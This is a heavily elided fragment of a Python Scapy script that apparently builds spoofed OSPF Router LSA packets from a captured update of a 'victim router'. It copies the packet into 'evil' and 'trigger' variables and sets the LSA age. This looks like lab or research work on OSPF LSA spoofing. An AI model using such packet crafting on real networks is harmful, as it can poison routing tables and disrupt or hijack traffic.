...
if __name__ == '__main__':
	...
	"""
	a = rdpcap("/home/anoop/Desktop/disg/topo2/fbmnew09.11.pcapng") 
	"""
	apparently the checksum calculated by the scapy is wrong thus using this method
	"""


	pkt_evil = a[42].copy() # index of the last lsa update from the victim router
	pkt_trig2 = a[42].copy()
	pkt_org1 = a[42].copy()
  ...
  Link type   Description       Link ID
	...
	pkt_evil[OSPF_Router_LSA].age = 5
